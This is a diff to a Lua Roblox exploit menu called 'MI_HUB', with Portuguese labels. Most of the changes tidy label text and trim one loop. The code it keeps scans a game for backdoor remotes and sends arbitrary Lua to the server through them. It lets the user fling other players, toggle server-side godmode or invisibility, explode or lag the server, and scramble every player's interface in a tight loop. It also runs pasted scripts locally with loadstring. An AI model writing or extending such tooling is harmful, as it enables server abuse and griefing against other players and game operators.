@@ -28,7 +28,7 @@ local tabExec = win:CreateTab({Name = "Executor", Icon = "terminal"})
 local statusLabel = tabExec:CreateLabel({Name = "Status: Aguardando INJECT..."})
 
 tabExec:CreateButton({
-    Name = "INJECT (Scan Remotes)",
+    Name = "INJECT Scan Remotes",
     Icon = "search",
     Callback = function()
         statusLabel:Set("Status: Escaneando remotes...")
@@ -98,7 +98,7 @@ tabExec:CreateButton({
 
 local textBox = tabExec:CreateTextArea({
     Name = "Script Code",
-    PlaceholderText = "-- Cole seu script Lua aqui (Executado localmente ou via backdoor)",
+    PlaceholderText = "Cole seu script Lua aqui",
     Height = 150,
     MaxLength = 0
 })
@@ -109,7 +109,7 @@ tabExec:CreateButton({
     Callback = function()
         local src = textBox:Get()
         if src == "" or src == nil then
-            win:Notify({Title = "Aviso", Content = "A textbox está vazia.", Duration = 3})
+            win:Notify({Title = "Aviso", Content = "A textbox esta vazia.", Duration = 3})
             return
         end
         if backdoorRemote then
@@ -119,7 +119,7 @@ tabExec:CreateButton({
         end
         local func, err = loadstring(src, "=MI_HUB")
         if not func then
-            win:Notify({Title = "Erro (Loadstring)", Content = tostring(err), Duration = 5})
+            win:Notify({Title = "Erro Loadstring", Content = tostring(err), Duration = 5})
             return
         end
         if setfenv then pcall(setfenv, func, getfenv(0)) end
@@ -127,25 +127,25 @@ tabExec:CreateButton({
         if ok then
             win:Notify({Title = "Executado", Content = "Script rodou localmente.", Duration = 3})
         else
-            win:Notify({Title = "Erro (Runtime)", Content = tostring(runErr), Duration = 5})
+            win:Notify({Title = "Erro Runtime", Content = tostring(runErr), Duration = 5})
         end
     end
 })
 
 
 -- ==========================================
--- ABA 2: UTILIDADES (Para você)
+-- ABA 2: UTILIDADES
 -- ==========================================
 local tabUtil = win:CreateTab({Name = "Utilidades", Icon = "user"})
 local grpLocal = tabUtil:CreateGroup({Name = "Local Player"})
 
-local speedInput = grpLocal:CreateInput({Name = "Velocidade (Speed)", PlaceholderText = "Ex: 100", Default = "16"})
+local speedInput = grpLocal:CreateInput({Name = "Velocidade Speed", PlaceholderText = "Ex 100", Default = "16"})
 grpLocal:CreateButton({Name = "Aplicar Velocidade", Icon = "wind", Callback = function()
     local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
     if h then h.WalkSpeed = tonumber(speedInput:Get()) or 16 end
 end})
 
-local jumpInput = grpLocal:CreateInput({Name = "Pulo (Jump)", PlaceholderText = "Ex: 100", Default = "50"})
+local jumpInput = grpLocal:CreateInput({Name = "Pulo Jump", PlaceholderText = "Ex 100", Default = "50"})
 grpLocal:CreateButton({Name = "Aplicar Pulo", Icon = "arrow-up", Callback = function()
     local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
     if h then h.JumpPower = tonumber(jumpInput:Get()) or 50 end
@@ -153,7 +153,7 @@ end})
 
 
 -- ==========================================
--- ABA 3: ADMIN (Usa a backdoor)
+-- ABA 3: ADMIN
 -- ==========================================
 local tabAdmin = win:CreateTab({Name = "Admin", Icon = "shield"})
 local grpPlayer = tabAdmin:CreateGroup({Name = "Alvo", Description = "Escolha o alvo"})
@@ -164,14 +164,14 @@ grpPlayer:CreatePlayerList({
     Multi = false,
     Callback = function(player) if player then selectedTarget = player.Name end end
 })
-grpPlayer:CreateButton({Name = "Selecionar Todos (ALL)", Icon = "users", Callback = function() selectedTarget = "ALL" end})
+grpPlayer:CreateButton({Name = "Selecionar Todos ALL", Icon = "users", Callback = function() selectedTarget = "ALL" end})
 
 tabAdmin:CreateSpacer(10)
-local grpAcoes = tabAdmin:CreateGroup({Name = "Ações (Via Backdoor)"})
+local grpAcoes = tabAdmin:CreateGroup({Name = "Acoes Via Backdoor"})
 
 local function sendCmd(cmd, args)
     if not backdoorRemote then 
-        win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
+        win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro", Duration = 3})
         return 
     end
     local code = ""
@@ -272,13 +272,13 @@ grpAcoes:CreateButton({Name = "Fling Alvo", Icon = "wind", Callback = function()
     if selectedTarget == "ALL" then for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then sendCmd("fling", {target = p.Name}) end end else sendCmd("fling", {target = selectedTarget}) end
 end})
 
-grpAcoes:CreateToggle({Name = "Godmode (Server-Side)", Icon = "shield", Default = false, Callback = function(state)
+grpAcoes:CreateToggle({Name = "Godmode Server-Side", Icon = "shield", Default = false, Callback = function(state)
     if selectedTarget == "" then return end
     local cmd = state and "godmode_on" or "godmode_off"
     if selectedTarget == "ALL" then for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then sendCmd(cmd, {target = p.Name}) end end else sendCmd(cmd, {target = selectedTarget}) end
 end})
 
-grpAcoes:CreateToggle({Name = "Invisibilidade (Server-Side)", Icon = "eye-off", Default = false, Callback = function(state)
+grpAcoes:CreateToggle({Name = "Invisibilidade Server-Side", Icon = "eye-off", Default = false, Callback = function(state)
     if selectedTarget == "" then return end
     local cmd = state and "invis_on" or "invis_off"
     if selectedTarget == "ALL" then for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then sendCmd(cmd, {target = p.Name}) end end else sendCmd(cmd, {target = selectedTarget}) end
@@ -286,15 +286,16 @@ end})
 
 
 -- ==========================================
--- ABA 4: SERVER (Destruição)
+-- ABA 4: SERVER
 -- ==========================================
 local tabServer = win:CreateTab({Name = "Server", Icon = "server"})
-local grpServer = tabServer:CreateGroup({Name = "Destruição Server-Side"})
+local grpServer = tabServer:CreateGroup({Name = "Destruicao Server-Side"})
 
 grpServer:CreateButton({Name = "Explodir Tudo", Icon = "bomb", Callback = function() sendCmd("explode") end})
-grpServer:CreateButton({Name = "Lag Server (Pesado)", Icon = "zap", Callback = function() sendCmd("lag") end})
+grpServer:CreateButton({Name = "Lag Server Pesado", Icon = "zap", Callback = function() sendCmd("lag") end})
 
-grpServer:CreateToggle({Name = "Rainbow Workspace (Loop Infinito)", Icon = "palette", Default = false, Callback = function(state)
+-- MAP COLOR RAINBOW NA ABA SERVER
+grpServer:CreateToggle({Name = "Map Rainbow", Icon = "palette", Default = false, Callback = function(state)
     if not backdoorRemote then return end
     if state then
         local code = [[
@@ -327,7 +328,8 @@ grpServer:CreateToggle({Name = "Rainbow Workspace (Loop Infinito)", Icon = "pale
     end
 end})
 
-grpServer:CreateToggle({Name = "CRIPTO ALL (Bagunçar Tudo)", Icon = "terminal", Default = false, Callback = function(state)
+-- CRYPTO ALTERADO (SÓ TEXTO DA GUI, RÁPIDO, SEM MAPA, SEM MATAR)
+grpServer:CreateToggle({Name = "Cripto All", Icon = "terminal", Default = false, Callback = function(state)
     if not backdoorRemote then return end
     if state then
         local code = [[
@@ -344,12 +346,6 @@ grpServer:CreateToggle({Name = "CRIPTO ALL (Bagunçar Tudo)", Icon = "terminal",
 
             task.spawn(function()
                 while _G.MI_Crypto do
-                    for _, v in ipairs(workspace:GetDescendants()) do
-                        if v:IsA("BasePart") then
-                            pcall(function() v.Anchored = false; v.CanCollide = false; v.Material = Enum.Material.Neon end)
-                        end
-                    end
-                    
                     for _, p in ipairs(game.Players:GetPlayers()) do
                         local pg = p:FindFirstChild("PlayerGui")
                         if pg then
@@ -364,7 +360,6 @@ grpServer:CreateToggle({Name = "CRIPTO ALL (Bagunçar Tudo)", Icon = "terminal",
                         end
                     end
                     
-                    -- Tenta bagunçar o CoreGui (Menu do Roblox)
                     pcall(function()
                         local cg = game:GetService("CoreGui")
                         for _, gui in ipairs(cg:GetDescendants()) do
@@ -377,12 +372,12 @@ grpServer:CreateToggle({Name = "CRIPTO ALL (Bagunçar Tudo)", Icon = "terminal",
                         end
                     end)
                     
-                    task.wait(0.01) -- Alterado aqui para ficar rápido e frenético
+                    task.wait(0.01)
                 end
             end)
         ]]
         pcall(function() if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end end)
-        win:Notify({Title = "Criptografia", Content = "Servidor sendo hackeado...", Duration = 3})
+        win:Notify({Title = "Cripto", Content = "Servidor sendo hackeado.", Duration = 3})
     else
         local code = [[ _G.MI_Crypto = false ]]
         pcall(function() if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end end)
